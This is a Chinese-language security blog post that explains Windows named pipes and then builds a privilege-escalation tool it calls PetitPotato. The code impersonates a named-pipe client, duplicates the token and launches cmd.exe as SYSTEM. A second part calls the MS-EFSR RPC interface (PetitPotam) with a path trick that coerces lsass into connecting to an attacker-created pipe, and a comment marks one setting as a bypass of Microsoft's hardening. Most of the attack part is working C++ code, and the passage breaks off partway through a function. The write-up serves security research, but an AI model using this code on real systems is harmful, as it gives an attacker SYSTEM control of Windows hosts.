---
title: PetitPotato - How Do I Escalate To SYSTEM Via Named Pipe
date: 2022-05-21 01:08:00 +0800
author: WHOAMI
toc: true
categories: ["Windows Security"]
tags: ["Privilege Escalation", "Impersonate Privileges", "Potatoes"]
layout: post
---

Windows 系统提供了与 `RpcImpersonateClient()` 功能相似的 `ImpersonateNamedPipeClient()` 函数。这意味着，在命名管道通信中，管道服务器也可以模拟已连接的管道客户端。因此，如果能够欺骗特权进程连接到我们创建的命名管道，我们可以通过令牌窃取的思路获得客户端令牌，并在特权令牌的上下文中创建进程。

[toc]

## PIPE

管道（PIPE）是一项古老的技术，可以在 Unix、Linux、Windows 等多种操作系统中找到，其本质是用于进程间通信的共享内存区域。在 Windows 系统中，存在两种类型的管道：匿名管道（Anonymous Pipes）和命名管道（Named Pipes）。

- 匿名管道

**匿名管道**用于重定向子进程的标准输入或输出，以便它可以与其父进程交换数据。若要（双工操作）双向交换数据，必须创建两个匿名管道。父进程使用写入句柄将数据写入到一个管道，而子进程则使用该管道的读取句柄从该管道读取数据。同样，子进程将数据写入其他管道，父进程从中读取数据。匿名管道不能通过网络使用，也不能在不相关的进程之间使用。

- 命名管道

**命名管道**用于在不是相关进程的进程之间传输数据，以及不同计算机上的进程之间的数据。通常，命名管道服务器进程会创建具有已知名称或要与其客户端通信的名称的命名管道。知道管道名称的命名管道客户端进程可以打开其另一端，但受命名管道服务器进程指定的访问限制。服务器和客户端都连接到管道后，可以通过对管道执行读取和写入操作来交换数据。

### View a List of Local Pipes

在 windows 系统中，我们可以通过 PowerShell Cmdlet 列出本地所有的管道列表：

```powershell
# PowerShell V3 以下版本
[System.IO.Directory]::GetFiles("\\.\pipe\")
# PowerShell V3 以上版本
Get-ChildItem "\\.\pipe\"
```

![](/assets/posts/2022-05-21-petitpotato-how-do-I-escalate-to-system-via-named-pipe/image-20220520101638169.png)

此外，微软 Sysinternals 工具包中的 pipelist.exe 工具也可以用来枚举管道列表：

```console
C:\Users\Marcus\Desktop> pipelist.exe
```

![](/assets/posts/2022-05-21-petitpotato-how-do-I-escalate-to-system-via-named-pipe/image-20220520101909651.png)

### Named Pipes Communication Example

通常情况下，我们可以通过 CreateNamedPipe API 创建命名管道，该函数的语法如下：

```c++
HANDLE CreateNamedPipeA(
  [in]           LPCSTR                lpName,
  [in]           DWORD                 dwOpenMode,
  [in]           DWORD                 dwPipeMode,
  [in]           DWORD                 nMaxInstances,
  [in]           DWORD                 nOutBufferSize,
  [in]           DWORD                 nInBufferSize,
  [in]           DWORD                 nDefaultTimeOut,
  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes
);
```

在创建命名管道的时，必须通过 `lpName` 参数指定一个命名管道名称（Pipe Name）。由于管道服务器无法在另一台计算机上创建管道，因此 `CreateNamedPipe()` 函数必须使用句点 `.` 作为服务器名称：

```console
\\.\pipe\PipeName
```

管道创建完成后，`CreateNamedPipe()` 函数会返回一个命名管道实例的句柄。此时，服务器进程就可以调用 `ConnectNamedPipe()` 函数来等待客户的连接请求。当客户端连接上命名管道后，服务器进程可以调用 `ReadFile()` 函数读取客户端发来的管道数据。相关实例代码如下：

```c++
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <conio.h>
#include <iostream>

#define BUFSIZE 256

using namespace std;

void _tmain(int argc, TCHAR* argv[])
{
	HANDLE hNamedPipe = NULL;
	LPCWSTR lpName = L"\\\\.\\pipe\\pipename";

	printf("[*] Creating named pipe and wait for connection.\n");

	hNamedPipe = CreateNamedPipe(
		lpName,
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		0,
		0,
		NMPWAIT_WAIT_FOREVER,
		0);

	if (hNamedPipe != INVALID_HANDLE_VALUE)
	{
		printf("[*] Created named pipe \\\\.\\pipe\\pipename succeeded.\n");
	}
	else
	{
		printf("[-] CreateNamedPipe() Error: %i.\n", GetLastError());
	}

	// waiting to be connected
	if (ConnectNamedPipe(hNamedPipe, NULL) != NULL)
	{
		printf("[*] The connection is successful, start receiving datas.\n");

		// Receive data from the server
		BOOL fSuccess = FALSE;
		DWORD len = 0;
		CHAR buffer[BUFSIZE];
		string revDatas = "";

		do
		{
			fSuccess = ReadFile(hNamedPipe, buffer, BUFSIZE * sizeof(char), &len, NULL);
			char buffer2[BUFSIZE + 1] = { 0 };
			memcpy(buffer2, buffer, len);
			revDatas.append(buffer2);
			if (!fSuccess || len < BUFSIZE)
			{
				break;
			}
		} while (true);
		cout << "[*] Received data:" << endl << revDatas.c_str() << endl << endl;
	}

	DisconnectNamedPipe(hNamedPipe);
	CloseHandle(hNamedPipe);
	printf("[*] Close named pipe.\n");
	system("pause");
}
```

管道客户端进程可以调用 `CreateFile()` 函数连接至正在监听的命名管道。连接成功后，`CreateFile()` 将返回一个指向已经建立连接的命名管道实例的句柄，此时服务端进程调用的 `ConnectNamedPipe()` 函数也将返回。客户都安可以通过 `WriteFile()` 函数向命名管道中写入数据。相关实例代码如下：

```c++
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <conio.h>
#include <iostream>

#define BUFSIZE 5

using namespace std;

void _tmain(int argc, TCHAR* argv[])
{
	HANDLE hNamedPipe = NULL;
	LPCWSTR lpNamedPipeName = L"\\\\.\\pipe\\pipename";

	printf("[*] Named Pipes: Client goes online.\n");
	printf("[*] Press any key to start connecting named pipes.\n");
	_getch();

	if (!WaitNamedPipe(lpNamedPipeName, NMPWAIT_WAIT_FOREVER))
	{
		return;
	}

	printf("[*] Opening named pipe \\\\.\\pipe\\pipename.\n");

	hNamedPipe = CreateFile(lpNamedPipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hNamedPipe != INVALID_HANDLE_VALUE)
	{
		printf("[*] The connection is successful, start sending data.\n");

		DWORD nNumberOfBytesToWrite;
		const char* lpBuffer = "Pipe datas from client...";
		if (!WriteFile(hNamedPipe, lpBuffer, strlen(lpBuffer), &nNumberOfBytesToWrite, NULL))
		{
			printf("Write failed...");
			return;
		}
		cout << "[*] Sent data: " << endl << lpBuffer << endl << endl;
	}
	else
	{
		printf("[-] CreateFile() Error: %i.\n", GetLastError());
	}

	FlushFileBuffers(hNamedPipe);
	DisconnectNamedPipe(hNamedPipe);
	CloseHandle(hNamedPipe);

	system("pause");
	return;
}
```

分别运行服务端和客户端后，实现的效果如下图所示：

![](/assets/posts/2022-05-21-petitpotato-how-do-I-escalate-to-system-via-named-pipe/image-20220520110154706.png)

## Impersonate a Named Pipe Client

熟悉 “Potato” 系列提权的朋友应该知道，它们早期的利用思路几乎都是相同的：利用 COM 接口的一些特性，欺骗 NT AUTHORITY\SYSTEM 账户连接并验证到攻击者控制的 RPC 服务器。通过一些列 API 调用对这个认证过程执行中间人（NTLM Relay）攻击，并为 NT AUTHORITY\SYSTEM 账户在本地生成一个访问令牌。最后窃取这个令牌，并使用 `CreateProcessWithToken()` 或 `CreateProcessAsUser()` 函数传入令牌创建新进程，以获取 SYSTEM 权限。

`CreateProcessWithToken()` 和 `CreateProcessAsUser()` 函数允许服务器应用程序在客户端的安全上下文中创建进程。例如，对于公开 RPC/COM 接口的 Windows 服务，每当您调用由作为高特权帐户运行的服务公开的 RPC 函数时，该服务可能会调用 `RpcImpersonateClient()` 函数来模拟客户端，以在客户端的安全上下文中运行代码或创建进程，从而降低特权提升漏洞的风险。

此外，Windows 系统提供了与 `RpcImpersonateClient()` 功能相似的 `ImpersonateNamedPipeClient()` 函数。这意味着，在命名管道通信中，管道服务器也可以模拟已连接的管道客户端。因此，如果能够欺骗特权进程连接到我们创建的命名管道，我们可以通过令牌窃取的思路获得客户端令牌，并在特权令牌的上下文中创建进程。

为了避免使本篇文章过于理论化，我编写了以下代码，用作一个具体的例子来进行演示：

```c++
#include <windows.h>
#include <stdio.h>
#include <thread>
#include <tchar.h>
#include <iostream>

void GetSystem(HANDLE hNamedPipe);

#define BUFSIZE 256

using namespace std;

void _tmain(int argc, TCHAR* argv[])
{
    HANDLE hNamedPipe = NULL;
    LPCWSTR lpName = L"\\\\.\\pipe\\pipename";

    printf("[*] Creating named pipe and wait for connection.\n");

    hNamedPipe = CreateNamedPipe(
        lpName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        0,
        0,
        NMPWAIT_WAIT_FOREVER,
        0);

    if (hNamedPipe != INVALID_HANDLE_VALUE)
    {
        printf("[*] Created named pipe \\\\.\\pipe\\pipename succeeded.\n");
    }
    else
    {
        printf("[-] CreateNamedPipe() Error: %i.\n", GetLastError());
    }

    // waiting to be connected
    if (ConnectNamedPipe(hNamedPipe, NULL) != NULL)
    {
        printf("[*] The connection is successful, start receiving datas.\n");

        // Receive data from the server
        BOOL fSuccess = FALSE;
        DWORD len = 0;
        CHAR buffer[BUFSIZE];
        string revDatas = "";

        do
        {
            fSuccess = ReadFile(hNamedPipe, buffer, BUFSIZE * sizeof(char), &len, NULL);
            char buffer2[BUFSIZE + 1] = { 0 };
            memcpy(buffer2, buffer, len);
            revDatas.append(buffer2);
            if (!fSuccess || len < BUFSIZE)
            {
                break;
            }
        } while (true);
        cout << "[*] Received data:" << endl << revDatas.c_str() << endl << endl;

        GetSystem(hNamedPipe);
    }

    DisconnectNamedPipe(hNamedPipe);
    CloseHandle(hNamedPipe);
    printf("[*] Close named pipe.\n");
    system("pause");
}


void GetSystem(HANDLE hNamedPipe)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    HANDLE hProcess;
    HANDLE hToken = NULL;
    HANDLE phNewToken = NULL;

    // clear a block of memory
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Impersonates a named-pipe client application.
    if (ImpersonateNamedPipeClient(hNamedPipe))
    {
        printf("[+] ImpersonateNamedPipeClient success.\n");
    }
    else
    {
        printf("[-] ImpersonateNamedPipeClient() Error: %i.\n", GetLastError());
        return;
    }

    // Open the impersonation token handle associated with the current thread.
    if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken))
    {
        printf("[+] OpenThreadToken success.\n");
    }
    else
    {
        printf("[-] OpenThreadToken() Error: %i.\n", GetLastError());
        return;
    }

    // Convert the impersonation token obtained in the previous step into the primary token
    if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &phNewToken))
    {
        printf("[+] DuplicateTokenEx success.\n");
    }
    else
    {
        printf("[-] DupicateTokenEx() Error: %i.\n", GetLastError());
        return;
    }

    // Creates a new process and its primary thread. The new process runs in the security context of the user represented by the specified token.
    if (CreateProcessAsUser(phNewToken, (LPWSTR)L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
        printf("[+] CreateProcessAsUser success.\n");

        CloseHandle(hToken);
        CloseHandle(phNewToken);

        return;
    }
    else if (GetLastError() != NULL)
    {
        RevertToSelf();
        printf("[!] CreateProcessAsUser() failed, possibly due to missing privileges, retrying with CreateProcessWithTokenW().\n");

        // Creates a new process and its primary thread. The new process runs in the security context of the specified token. It can optionally load the user profile for the specified user.
        if (CreateProcessWithTokenW(phNewToken, LOGON_WITH_PROFILE, (LPWSTR)L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
        {
            printf("[+] CreateProcessWithTokenW success.\n");

            CloseHandle(hToken);
            CloseHandle(phNewToken);

            return;
        }
        else
        {
            printf("[-] CreateProcessWithTokenW failed (%d).\n", GetLastError());

            CloseHandle(hToken);
            CloseHandle(phNewToken);

            return;
        }
    }
}

```

运行上述代码，将由 `_tmain()` 函数将创建一个命名管道，管道服务器调用 `ConnectNamedPipe()` 等待客户端连接。当客户端连接成功后，服务器程序将调用 `ReadFile()` 来读取客户端写入的数据，并调用我们自定义的 `GetSystem()` 函数模拟管道客户端。在 `GetSystem()` 的函数的内部将依次完成以下工作：

1. 通过 `ImpersonateNamedPipeClient()` 函数模拟命名管道客户端。
2. 通过 `GetCurrentThread()` 和 `OpenThreadToken()` 函数打开与当前线程关联的模拟令牌句柄。
3. 调用 `DuplicateTokenEx()` 函数，复制上一步获取到的模拟令牌来创建一个主令牌。
4. 调用 `CreateProcessAsUser()` 函数，通过上一步获取到的主令牌创建进程。成功执行 `CreateProcessAsUser()` 函数需要拥有 SeAssignPrimaryTokenPrivilege 特权的上下文。
5. 如果 `CreateProcessAsUser()` 函数执行失败，则尝试调用 `CreateProcessWithTokenW()` 函数创建进程。成功执行 `CreateProcessWithTokenW()` 函数需要拥有 SeImpersonatePrivilege 特权的上下文。

如果此时以 NT AUTHORITY\SYSTEM 账户运行的特权进程连接至该管道服务器，那么我们将获得一个 SYSTEM 权限运行的命令行窗口，如下图所示。为了便于演示，我预先通过 PsExec 获得了 SYSTEM 权限，并通过 SYSTEM 权限运行以下命令，通过重定向连接至上述管道。

```console
C:\Users\Marcus\Desktop> echo "Pipe datas from client" > \\.\pipe\pipename
```

![](/assets/posts/2022-05-21-petitpotato-how-do-I-escalate-to-system-via-named-pipe/image-20220520110254709.gif)

需要注意的是，调用 `CreateProcessWithToken()` 和 `CreateProcessAsUser()` 函数必须分别拥有 SeImpersonatePrivilege 和 SeAssignPrimaryTokenPrivilege 特权，而拥有这两项特权的一般是以下账户：

- 系统管理员账户（RID 500）
- 本地服务账户（NT AUTHORITY\Local Service）
- 网络服务账户（NT AUTHORITY\Network Service）

因此通过模拟令牌提权的方法适用于将以获取的管理员权限或服务账户权限提升至 SYSTEM 权限。

## Get Privilege Tokens via PetitPotam

在上一节中，我们已经通过模拟管道客户端获取了 SYSTEM 权限。但到目前为止，我们仍需手动操作 NT AUTHORITY\SYSTEM 账户连接至命名管道才能完成攻击。那么能否欺骗 NT AUTHORITY\SYSTEM 账户自动连接至我们控制的命名管道呢？当然可以！

早在 2020 年 5 月，Clément Labro（[@itm4n](https://twitter.com/itm4n)）便通过滥用 MS-RPRN RPC 接口（Printerbug）来强制计算机账户认证到命名管道，并通过模拟管道客户端实现了本地提权。想了解更多细节的读者可以阅读这篇文章：[*PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019*](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)。

此外，法国安全研究人员 Gilles Lionel（[@topotam](https://twitter.com/topotam77)）在 2021 年 7 月披露了一种新型的强制身份验证的方法——[PetitPotam](https://github.com/topotam/PetitPotam)。PetitPotam 滥用了 MS-EFSR（Encrypting File System Remote，加密文件系统远程协议）协议，该协议接口中存在一系列函数，其 FileName 参数可以指定 UNC 路径。那么我们能否使用 [PetitPotam](https://github.com/topotam/PetitPotam) 替代 Printerbug，并达到与之相同的效果呢？

### Clear Information about RPC calls

为了进一步了解 PetitPotam 背后的原理，我们尝试在本地调用 MS-EFSR RPC 接口，并观察其运行后的行为。在调用 RPC 之前，我们需要明确一下信息：

- RPC 接口的 GUID：用于唯一标识一个接口，例如 MS-EFSR 接口的 GUID 为 `c681d488-d850-11d0-8c52-00c04fd90f7e`。
- 接口公开的过程/功能：这里我们以接口中的 `EfsRpcOpenFileRaw()` 函数为例。
- 协议序列：Windows 中支持 14 种协议序列，常用的有 ncacn_ip_tcp、ncacn_np、ncacn_http 和 ncalrpc。
- 调用函数传入的参数。

在本文中，我们通过 RpcView 工具来获取上述信息。选中 lsass.exe 进程，通过 GUID 在左下角的 “Interfaces” 窗口中找到 MS-EFSR 接口，如下图所示。

![](/assets/posts/2022-05-21-petitpotato-how-do-I-escalate-to-system-via-named-pipe/image-20220520212617469.png)

右下角的 “Procedures” 窗口中显示了该接口公开的所有过程列表，这里我们选择 `EfsRpcOpenFileRaw()` 方法。此外，在左上角的 “Endpoints” 窗口中可知，当前接口是通过命名管道 `\pipe\lsass` 和 `\pipe\efsrpc` 公开的。右上角的 “Processes Properties” 窗口告诉我们该接口的过程以 NT AUTHORITY\SYSTEM 账户权限运行。

此外，为了明确 MS-EFSR 接口中的数据类型，我们需要获取它的 IDL 文件。RPC 服务器的开发人员通常会发布一个 IDL（接口定义语言）文件，此文件的目的是为 RPC 客户端的开发人员提供此接口中过程/函数的参数、数据类型等基本结构信息。微软官方已经发布了 MS-EFSR 接口的 IDL 文件，其可以在这里找到：https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/4a25b8e1-fd90-41b6-9301-62ed71334436。

这里我们直接在 RpcView 选中接口的 GUID，“右键” —> “Decompile” 进行反编译，将在左侧的 “Decompilation” 窗口中得到接口的 IDL 代码，如下图所示。

![](/assets/posts/2022-05-21-petitpotato-how-do-I-escalate-to-system-via-named-pipe/image-20220520214952785.png)

反编译得到的代码如下所示：

```c++
 [
 uuid(df1941c5-fe89-4e79-bf10-463657acf44d),
 version(1.0),
 ]
 interface efsrpc
 {
  // ...
 long EfsRpcOpenFileRaw(
     [in]            handle_t                   binding_h,
     [out]           PEXIMPORT_CONTEXT_HANDLE * hContext,
     [in, string]    wchar_t                  * FileName,
     [in]            long                       Flags
     );
  
 long EfsRpcReadFileRaw(
     [in]            PEXIMPORT_CONTEXT_HANDLE   hContext,
     [out]           EFS_EXIM_PIPE            * EfsOutPipe
     );
  
 long EfsRpcWriteFileRaw(
     [in]            PEXIMPORT_CONTEXT_HANDLE   hContext,
     [in]            EFS_EXIM_PIPE            * EfsInPipe
     );
  
 void EfsRpcCloseRaw(
     [in, out]       PEXIMPORT_CONTEXT_HANDLE * hContext
     );
  
 long EfsRpcEncryptFileSrv(
     [in]            handle_t    binding_h,
     [in, string]    wchar_t   * FileName
     );
  
 // ...
  
 //local only method
 void Opnum43NotUsedOnWire(void);
  
 //local only method
 void Opnum44NotUsedOnWire(void);
 }
```

### Call the MS-EFSR RPC Interface

到目前为止，我们已经拥有了调用 MS-EFSR RPC 接口需要的全部信息，我们可以在 visual Studio 中 创建一个 C/C++ 项目，编写一个 RPC 客户端开始使用该接口。

![](/assets/posts/2022-05-21-petitpotato-how-do-I-escalate-to-system-via-named-pipe/image-20220520215601778.png)

在解决方案资源管理器中选择 “源文件”，右键 “添加” —> “新建项”，添加一个名为 “ms-efsr.idl” 的文件，并将之前反编译得到的 IDL 代码复制进去。然后，我们需要选中 ms-efsr.idl 文件，“右键”—>“编译”。一切顺利的话将看到如下图所示的输出信息：

![](/assets/posts/2022-05-21-petitpotato-how-do-I-escalate-to-system-via-named-pipe/image-20220520220357781.png)

此时，MIDL 编译器将创建了以下 3 个文件：

|    文件     |  类型  |              描述               |
| :---------: | :----: | :-----------------------------: |
| ms-efsr_h.h | 头文件 | 接口中过程/函数和结构原型的定义 |
| ms-efsr_c.c | 源文件 |     RPC 客户端运行时的代码      |
| ms-efsr_s.c | 源文件 |    RPC 服务器端运行时的代码     |

这里需要用到的有 ms-efsr_h.h 和 ms-efsr_c.c，我们可以分别在解决方案资源管理器中选择 “头文件” 和 “源文件”，分别右键 “添加” —> “现有项” 将他们添加进来：

![](/assets/posts/2022-05-21-petitpotato-how-do-I-escalate-to-system-via-named-pipe/image-20220520221102578.png)

到这里，我们终于可以编写并运行 RPC 客户端代码了：

```c++
// EfsrRpcClient.cpp
#include "ms-efsr_h.h"
#include <tchar.h>
#include <iostream>
#include <strsafe.h>

#pragma comment(lib, "RpcRT4.lib")

void _tmain(int argc, TCHAR* argv[])
{
    RPC_WSTR ObjUuid = (RPC_WSTR)L"c681d488-d850-11d0-8c52-00c04fd90f7e";    // Pointer to a null-terminated string representation of an object UUID. 
    RPC_WSTR ProtSeq = (RPC_WSTR)L"ncacn_np";                                // Pointer to a null-terminated string representation of a protocol sequence.;
    RPC_WSTR NetworkAddr = (RPC_WSTR)L"\\\\127.0.0.1";                       // Pointer to a null-terminated string representation of a network address.
    RPC_WSTR Endpoint = (RPC_WSTR)L"\\pipe\\lsass";                          // Pointer to a null-terminated string representation of an endpoint.
    RPC_WSTR Options = NULL;                                                 // Pointer to a null-terminated string representation of network options.
    RPC_WSTR StringBinding;                                                  // Returns a pointer to a pointer to a null-terminated string representation of a binding handle.

    RPC_STATUS RpcStatus;

    RPC_BINDING_HANDLE binding_h;

    RpcStatus = RpcStringBindingComposeW(ObjUuid, ProtSeq, NetworkAddr, Endpoint, Options, &StringBinding);
    if (RpcStatus != RPC_S_OK) {
        printf("[-] RpcStringBindingComposeW() Error: %i\n", GetLastError());
        return;
    }

    RpcStatus = RpcBindingFromStringBindingW(
        StringBinding,    // Previously created string binding
        &binding_h    // Output binding handle
    );
    if (RpcStatus != RPC_S_OK) {
        printf("[-] RpcBindingFromStringBindingW() Error: %i\n", GetLastError());
        return;
    }
    
    RpcStatus = RpcBindingSetAuthInfoW(binding_h, NetworkAddr, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, 0, RPC_C_AUTHZ_NONE);
    if (RpcStatus != RPC_S_OK) {
        printf("[-] RpcBindingSetAuthInfoW() Error: %i\n", GetLastError());
        return;
    }

    RpcStatus = RpcBindingSetOption(binding_h, 12, 50000);
    if (RpcStatus != RPC_S_OK) {
        printf("[-] RpcBindingSetOption() Error: %i\n", GetLastError());
        return;
    }

    RpcStringFreeW(&StringBinding);
    if (RpcStatus != RPC_S_OK) {
        printf("[-] RpcStringFreeW() Error: %i\n", GetLastError());
        return;
    }

    RpcTryExcept
    {
        // Invoke remote procedure here
        LPWSTR PipeFileName;
        long result;

        PipeFileName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
        StringCchPrintf(PipeFileName, MAX_PATH, L"\\\\127.0.0.1\\C$\\Folder\\test.txt");

        wprintf(L"[+] Invoking EfsRpcOpenFileRaw with target path: %ws.\r\n", PipeFileName);

        /*
         *  long EfsRpcOpenFileRaw(
         *      [in] handle_t binding_h,
         *      [out] PEXIMPORT_CONTEXT_HANDLE* hContext,
         *      [in, string] wchar_t* FileName,
         *      [in] long Flags
         *  );
         */

        PVOID hContext;
        result = EfsRpcOpenFileRaw(binding_h, &hContext, PipeFileName, 0);
    }
    RpcExcept(EXCEPTION_EXECUTE_HANDLER);
    {
        wprintf(L"Exception: %d - 0x%08x.\r\n", RpcExceptionCode(), RpcExceptionCode());
    }
    RpcEndExcept
    {
        RpcBindingFree(&binding_h);
    }
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
    free(p);
}
```

上述代码将依次完成以下工作：

1. 通过 `RpcStringBindingCompose()` 函数创建一个 RPC 绑定字符串。
2. 通过 `RpcBindingFromStringBinding()` 函数，以根据上一步创建的绑定字符串创建绑定句柄。
3. 通过 `RpcBindingSetAuthInfoW()` 函数将 RPC 身份验证级别设为 `RPC_C_AUTHN_LEVEL_PKT_PRIVACY`。
4. 调用 `RpcStringFree()` 函数释放绑定字符串，后续将不再使用该绑定字符串。
5. 在 `RpcTryExcept` 块中使用绑定句柄调用远程过程，这里调用的是 `EfsRpcOpenFileRaw()` 函数。
6. 调用 `RpcBindingFree()` 以释放绑定句柄。

这里注意以下问题：

> 2021 年 12 月，Microsoft 发布了针对不同 EFSRPC 漏洞的补丁：CVE-2021-43217。作为该问题补救措施的一部分，Microsoft 对 EFSRPC 通信实施了一些强化措施。特别是，EFSRPC 客户端在使用 EFSRPC 时需要将身份验证级别设为 RPC_C_AUTHN_LEVEL_PKT_PRIVACY。如果客户端未能这样做，则客户端将被拒绝并生成 Windows 应用程序事件。
>
> ![image-20230315130337156](/assets/posts/2022-05-21-petitpotato-how-do-I-escalate-to-system-via-named-pipe/image-20230315130337156.png)

现在，让我们编译并运行上述代码，同时使用 Process Monitor 监视后台进程。可以看到，lsass.exe 进程试图访问 `\\127.0.0.1\C$\Folder\test.txt` 这个 UNC 路径的文件，如下图所示。

![](/assets/posts/2022-05-21-petitpotato-how-do-I-escalate-to-system-via-named-pipe/image-20220520225037190.png)

双击该条目查看更多细节，我们可以看到，RPC 服务器实际上是在模拟客户端，如下图所示。然而，我们在前文中模拟管道客户端时，需要的是 NT AUTHORITY\SYSTEM 这样的特权账户，很明显这不符合我们的要求。

![](/assets/posts/2022-05-21-petitpotato-how-do-I-escalate-to-system-via-named-pipe/image-20220520225113801.png)

在此观察 Process Monitor 中的条目会发现，lsass.exe 进程在访问 `\\127.0.0.1\C$\Folder\test.txt` 文件之前，会先打开 `\\127.0.0.1\PIPE\srvsvc` 这个命名管道，并且这一次没有模拟客户端：

![](/assets/posts/2022-05-21-petitpotato-how-do-I-escalate-to-system-via-named-pipe/image-20220520232747419.png)

如果阅读过 [*PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019*](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) 这篇文章，你会发现在 PrintSpoofer 中也出现过类似的行为，它试图打开命名管道 `\pipe\spoolss`。

此外，根据 PrintSpoofer 文中介绍的一个非常关键的 Trick，如果我们指定管道路径为 `\\127.0.0.1/pipe/pipename\C$\test.txt`，当客户端连接时，会自动将其转换为`\\127.0.0.1\pipe\pipename\PIPE\srvsvc`，如下图所示。通过这一点可以欺骗客户端连接至我们控制的命名管道。

![](/assets/posts/2022-05-21-petitpotato-how-do-I-escalate-to-system-via-named-pipe/image-20220520234531026.png)

并且，由于 lsass.exe 进程以 `NT AUTHORITY\SYSTEM` 帐户权限运行，当在已加入域的计算机上使用远程路径调用此过程时，Windows 将实际使用计算机帐户在 UAC 路径所指向的服务器上进行身份验证。这就解释了为什么 “PetitPotam” 能够强制任意 Windows 机器对另一台机器进行身份验证。

### Obtain a Privileged Token to Create a Process

分析到这里，我们完全可以用 PetitPotam 替代 Printerbug，并创建一个与 PrintSpoofer 类似的提权工具，其实现的核心步骤大致如下。

（1）首先，我编写了一个自定义函数 `LaunchNamedPipeServer()`，通过该函数创建一个命名管道 `\\\\.\\pipe\\petit\\pipe\\srvsvc`，并调用 `ConnectNamedPipe()` 函数等待客户端连接：

```c++
DWORD WINAPI LaunchNamedPipeServer(LPVOID lpParam)
{
    HANDLE hNamedPipe = NULL;
    LPWSTR lpName;
    LPWSTR lpCommandLine = (LPWSTR)lpParam;

    SECURITY_DESCRIPTOR sd = { 0 };
    SECURITY_ATTRIBUTES sa = { 0 };

    lpName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintfW(lpName, MAX_PATH, L"\\\\.\\pipe\\petit\\pipe\\srvsvc");

    if ((hNamedPipe = CreateNamedPipe(lpName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa)))
    {
        printf("\n[+] Malicious named pipe running on %S.\n", lpName);
    }
    else
    {
        printf("[-] ImpersonateNamedPipeClient() Error: %i.\n", GetLastError());
        return 0;
    }

    if (ConnectNamedPipe(hNamedPipe, NULL) != NULL)
    {
        printf("[+] The connection is successful.\n");
    }
    else
    {
        printf("[-] ConnectNamedPipe() Error: %i.\n", GetLastError());
        return 0;
    }

    GetSystem(hNamedPipe, lpCommandLine);
    CloseHandle(hNamedPipe);

    return 0;
}
```

（2）然后，编写 `CreateRpcBinding()` 函数，用于创建 RPC 绑定供 MS-EFSR RPC 接口使用。

```c++
BOOL CreateRpcBinding(RPC_BINDING_HANDLE* hBinding)
{
    BOOL status = FALSE;
    RPC_WSTR ObjUuid = (RPC_WSTR)L"df1941c5-fe89-4e79-bf10-463657acf44d";                // Pointer to a null-terminated string representation of an object UUID. 
    RPC_WSTR ProtSeq = (RPC_WSTR)L"ncacn_np";                                            // Pointer to a null-terminated string representation of a protocol sequence.;
    RPC_WSTR NetworkAddr = (RPC_WSTR)L"\\\\127.0.0.1";                                   // Pointer to a null-terminated string representation of a network address.
    RPC_WSTR Endpoint = NULL;                                                            // Pointer to a null-terminated string representation of an endpoint.
    RPC_WSTR Options = NULL;                                                             // Pointer to a null-terminated string representation of network options.
    RPC_WSTR StringBinding;                                                              // Returns a pointer to a pointer to a null-terminated string representation of a binding handle.

    RPC_STATUS RpcStatus;

    *hBinding = NULL;

    RpcStatus = RpcStringBindingComposeW(ObjUuid, ProtSeq, NetworkAddr, Endpoint, Options, &StringBinding);
    if (RpcStatus != RPC_S_OK) {
        printf("[-] RpcStringBindingComposeW() Error: %i\n", GetLastError());
        return status;
    }


    RpcStatus = RpcBindingFromStringBindingW(
        StringBinding,    // Previously created string binding
        hBinding    // Output binding handle
    );
    if (RpcStatus != RPC_S_OK) {
        printf("[-] RpcBindingFromStringBindingW() Error: %i\n", GetLastError());
        return status;
    }

    // PetitPotam bypass via RPC_C_AUTHN_LEVEL_PKT_PRIVACY: https://github.com/zcgonvh/EfsPotato/pull/5
    RpcStatus = RpcBindingSetAuthInfoW(*hBinding, NetworkAddr, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, 0, RPC_C_AUTHZ_NONE);
    if (RpcStatus != RPC_S_OK) {
        printf("[-] RpcBindingSetAuthInfoW() Error: %i\n", GetLastError());
        return status;
    }

    RpcStatus = RpcBindingSetOption(*hBinding, 12, 5000000);
    if (RpcStatus != RPC_S_OK) {
        printf("[-] RpcBindingSetOption() Error: %i\n", GetLastError());
        return status;
    }

    RpcStringFreeW(&StringBinding);
    if (RpcStatus != RPC_S_OK) {
        printf("[-] RpcStringFreeW() Error: %i\n", GetLastError());
        return status;
    }

